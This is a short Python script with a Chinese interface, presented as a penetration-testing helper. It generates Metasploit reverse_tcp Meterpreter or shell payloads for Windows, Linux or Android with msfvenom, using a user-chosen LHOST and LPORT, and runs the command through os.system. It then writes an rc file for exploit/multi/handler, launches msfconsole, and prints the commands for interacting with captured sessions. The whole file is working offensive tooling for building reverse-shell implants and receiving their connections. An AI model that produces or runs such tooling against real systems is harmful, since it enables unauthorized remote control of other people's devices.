import os
import time

def generate_payload():
    payload_options = {
        '1': 'windows/meterpreter/reverse_tcp',
        '2': 'linux/x86/meterpreter/reverse_tcp',
        '3': 'linux/x64/meterpreter/reverse_tcp',
        '4': 'android/meterpreter/reverse_tcp',
        '5': 'windows/shell/reverse_tcp',
        '6': 'linux/x86/shell/reverse_tcp',
        '7': 'linux/x64/shell/reverse_tcp',
        '8': 'android/shell/reverse_tcp'
    }

    print("请选择要生成的有效载荷类型：")
    for key, value in payload_options.items():
        print(f"{key}. {value}")

    payload_choice = input("请输入选项（1/2/3/4/5/6/7/8）：")
    payload = payload_options.get(payload_choice)

    if payload:
        lhost = input("请输入LHOST（本地主机IP地址）：")
        lport = input("请输入LPORT（本地端口）：")
        output_format = input("请输入输出格式（exe, elf, apk 等）：")
        output_file = input("请输入输出文件名：")

        command = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {output_format} -o {output_file}.{output_format}"
        print(f"生成的命令是：\n{command}")
        os.system(command)
        print("命令执行成功")

        start_msf_listener(payload, lhost, lport)
    else:
        print("无效选项，请重新输入。")

def start_msf_listener(payload, lhost, lport):
    rc_file = 'msf_listener.rc'
    with open(rc_file, 'w') as file:
        file.write(f"use exploit/multi/handler\n")
        file.write(f"set PAYLOAD {payload}\n")
        file.write(f"set LHOST {lhost}\n")
        file.write(f"set LPORT {lport}\n")
        file.write("exploit -j\n")

    print("启动 Metasploit 监听器命令是：")
    print(f"msfconsole -r {rc_file}")
    os.system(f"msfconsole -r {rc_file}")
    print("Metasploit 监听器启动成功")

    print("要查看和交互Meterpreter会话，请在Metasploit控制台中执行以下命令：")
    print("1. sessions -l   # 查看活动会话")
    print("2. sessions -i <session_id>   # 与特定会话交互")

def main():
    while True:
        print("渗透测试助手")
        print("1. 生成有效载荷")
        print("2. 退出")
        choice = input("请输入选项（1/2）：")
        if choice == '1':
            generate_payload()
            break  # 在生成有效载荷并启动监听器后退出循环
        elif choice == '2':
            print("退出程序")
            break
        else:
            print("无效选项，请重新输入。")

if __name__ == "__main__":
    main()
